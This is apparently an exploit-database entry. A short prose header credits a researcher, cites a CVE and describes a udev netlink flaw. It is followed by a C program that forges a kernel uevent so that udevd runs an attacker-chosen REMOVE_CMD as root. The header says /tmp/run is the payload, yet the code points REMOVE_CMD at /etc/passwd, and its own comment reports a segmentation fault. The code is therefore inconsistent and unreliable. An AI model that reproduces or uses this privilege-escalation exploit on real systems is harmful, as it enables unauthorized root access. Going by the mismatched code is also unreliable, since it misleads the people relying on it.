/*
# Title: Linux Kernel 4.8.0 udev 232 - Privilege Escalation
# Author: Nassim Asrir
# Researcher at: Henceforth
# Author contact: wassline@gmail.com || https://www.linkedin.com/in/nassim-asrir-b73a57122/
# The full Research: https://www.facebook.com/asrirnassim/
# CVE: CVE-2017-7874

# Exp #

first of all we need to know a small infos about udev and how it work

the udev deamon is responsible for receiving device events from the kernel

and this event are delivered to udev via netlink (is a socket family)

you can read more about udev from: https://en.wikipedia.org/wiki/Udev

# Exploit #

The udev vulnerability resulted from a lack of verification of the netlink message source in udevd.

read lines from: /lib/udev/rules.d/50-udev-default.rules

all we need is this action: ACTION=="remove", ENV{REMOVE_CMD}!="", RUN+="$env{REMOVE_CMD}"

this action allows execution of arbitrary commands.

in our exploit we specifying a malicious REMOVE_CMD and causes the privileged execution of attacker-controlled /tmp/run file.

Get your udev version:

Execute: $ udevadm --version

//output: 232

Maybe < 232 also is vulnerable
*/



// gcc rootme.c -o rootme
// ./rootme
// segmantation fault

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/types.h>
#include <linux/netlink.h>

#ifndef NETLINK_KOBJECT_UEVENT
#define NETLINK_KOBJECT_UEVENT 15
#endif

int
main(int argc, char **argv)
{
  int sock;
  char *mp;
  char message[4096];
  struct msghdr msg;
  struct iovec iovector;
  struct sockaddr_nl address;

  memset(&address, 0, sizeof(address));
  address.nl_family = AF_NETLINK;
  address.nl_pid = atoi(argv[1]);
  address.nl_groups = 0;

  msg.msg_name = (void*)&address;
  msg.msg_namelen = sizeof(address);
  msg.msg_iov = &iovector;
  msg.msg_iovlen = 1;

  sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT);
  bind(sock, (struct sockaddr *) &address, sizeof(address));

  mp = message;
  mp += sprintf(mp, "a@/d") + 1;
  mp += sprintf(mp, "SUBSYSTEM=block") + 1;
  mp += sprintf(mp, "DEVPATH=/dev/foo") + 1;
  mp += sprintf(mp, "TIMEOUT=10") + 1;
  mp += sprintf(mp, "ACTION=remove") +1;
  mp += sprintf(mp, "REMOVE_CMD=/etc/passwd") +1;

  iovector.iov_base = (void*)message;
  iovector.iov_len = (int)(mp-message);

  sendmsg(sock, &msg, 0);

  close(sock);

  return 0;
}